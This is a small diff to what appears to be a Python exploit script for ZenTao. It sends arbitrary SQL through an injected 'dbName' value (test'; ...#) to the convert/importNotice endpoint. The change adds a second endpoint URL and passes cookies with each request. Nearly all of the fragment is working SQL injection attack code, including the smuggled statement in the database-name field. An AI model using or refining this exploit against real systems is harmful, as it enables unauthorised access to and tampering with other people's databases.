@@ -13,5 +13,6 @@ while True:
     data = {
         "dbName": "test'; "+sql + "# "
     }
-    requests.post(url+"?m=convert&f=importNotice&zentaosid="+zentaosid, headers=headers, data=data)
+    requests.post(url+"convert-importNotice.html?zentaosid="+zentaosid, headers=headers, cookies=cookies, data=data)
+    requests.post(url+"?m=convert&f=importNotice&zentaosid="+zentaosid, headers=headers, cookies=cookies, data=data)
     print("Exec success (on echo).")
